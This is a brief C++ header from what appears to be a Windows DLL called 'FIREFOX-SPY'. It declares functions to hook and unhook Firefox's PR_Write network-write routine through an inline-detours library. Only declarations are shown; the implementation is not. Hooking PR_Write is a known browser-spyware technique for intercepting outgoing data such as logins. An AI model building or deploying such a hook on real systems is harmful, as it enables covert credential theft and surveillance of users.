//////////////////////////////////////////////
// (c) h4lf-jiffie (dohmatob elvis dopgima)
/////////////////////////////////////////////

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN               // exclude rarely-used stuff from Windows headers
#endif

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <fstream>
#include <string>
#include <map>
#include <vector>
#include "inlinedetours.h"

#define __DLL_PSEUDO__ "FIREFOX-SPY"

// MDN stuff
typedef DWORD (*PR_Write_t)(void *, const void *, DWORD); // refer to https://developer.mozilla.org/en/PR_Write for doc on PR_Write

// function declarations (see firefoxspy.cpp for implementation and doc)
extern "C" void HookPR_Write(void);
extern "C" void UnhookPR_Write(void);
